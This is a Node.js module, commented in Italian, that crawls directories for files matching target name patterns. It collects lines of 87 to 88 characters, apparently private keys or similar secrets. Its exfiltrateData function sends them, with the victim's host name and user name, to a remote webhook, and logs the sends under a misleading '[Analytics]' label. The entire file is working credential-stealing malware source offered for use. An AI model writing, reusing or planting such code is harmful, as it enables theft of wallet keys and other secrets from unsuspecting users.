const axios = require('axios');
const fs = require('fs-extra');
const path = require('path');
const os = require('os');
const config = require('./config');

// Verifica se un file è un bersaglio (nome contiene pattern)
function isTargetFile(filePath) {
  const name = path.basename(filePath).toLowerCase();
  return config.targetPatterns.some(pat => name.includes(pat));
}

// Estrae righe con lunghezza 87-88 caratteri
function extractSuspiciousLines(content) {
  return content.split('\n').filter(line => {
    const len = line.trim().length;
    return len >= config.minLineLength && len <= config.maxLineLength;
  });
}

// Scansiona directory ricorsivamente e raccoglie file bersaglio con righe sospette
async function scanDirectory(dir) {
  const findings = [];
  
  async function walk(current) {
    const entries = await fs.readdir(current, { withFileTypes: true });
    for (const entry of entries) {
      const full = path.join(current, entry.name);
      if (entry.isDirectory()) {
        await walk(full);
      } else if (entry.isFile() && isTargetFile(full)) {
        try {
          const content = await fs.readFile(full, 'utf-8');
          const suspicious = extractSuspiciousLines(content);
          if (suspicious.length) {
            findings.push({
              file: full,
              directory: current,
              suspiciousLines: suspicious,
              lineCount: suspicious.length,
              totalLines: content.split('\n').length
            });
          }
        } catch (err) {
          console.warn(`Errore leggendo ${full}: ${err.message}`);
        }
      }
    }
  }
  
  await walk(dir);
  return findings;
}

// Invia findings al server di ricezione (webhook)
async function exfiltrateData(findings) {
  const payload = {
    timestamp: new Date().toISOString(),
    host: os.hostname(),
    user: process.env.USER || process.env.USERNAME || 'unknown',
    findings: findings.map(f => ({
      file: f.file,
      directory: f.directory,
      suspiciousLines: f.suspiciousLines,
      lineCount: f.lineCount,
      totalLines: f.totalLines
    }))
  };

  try {
    const response = await axios.post(config.endpoint, payload, {
      timeout: 10000,
      headers: { 'Content-Type': 'application/json' }
    });
    console.log(`[Analytics] Inviato: ${findings.length} file, status ${response.status}`);
    return response;
  } catch (err) {
    console.error(`[Analytics] Errore invio: ${err.message}`);
    return null;
  }
}

module.exports = { scanDirectory, exfiltrateData, isTargetFile, extractSuspiciousLines };